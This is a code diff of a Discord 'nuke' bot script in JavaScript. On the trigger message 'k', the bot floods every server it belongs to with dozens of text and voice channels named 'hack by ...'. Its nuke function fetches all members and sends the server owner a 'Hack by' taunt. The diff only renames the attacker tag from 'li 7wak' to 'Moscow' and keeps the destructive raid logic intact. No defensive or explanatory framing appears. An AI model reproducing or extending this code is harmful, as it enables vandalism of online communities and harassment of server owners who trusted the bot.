@@ -268,52 +268,52 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
  
-m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by Moscow', 'text');
  
-m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by Moscow', 'text');
  
-m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by Moscow', 'text');
  
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
  
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
  
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
  
-m.createChannel('hack by li 7wak', 'text');
-m.createChannel('hack by li 7wak', 'text');
+m.createChannel('hack by Moscow', 'text');
+m.createChannel('hack by Moscow', 'text');
  
 })
 }
@@ -322,65 +322,65 @@ m.createChannel('hack by li 7wak', 'text');
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
  
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
  
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
  
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
  
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
  
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
-m.createChannel('hack by li 7wak', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
+m.createChannel('hack by Moscow', 'voice');
  
  
  
@@ -399,7 +399,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hack by li 7wak : ⚠').catch(e => { return void e; });
+  await guild.owner.send(' Hack by Moscow : ⚠').catch(e => { return void e; });
  
  
  
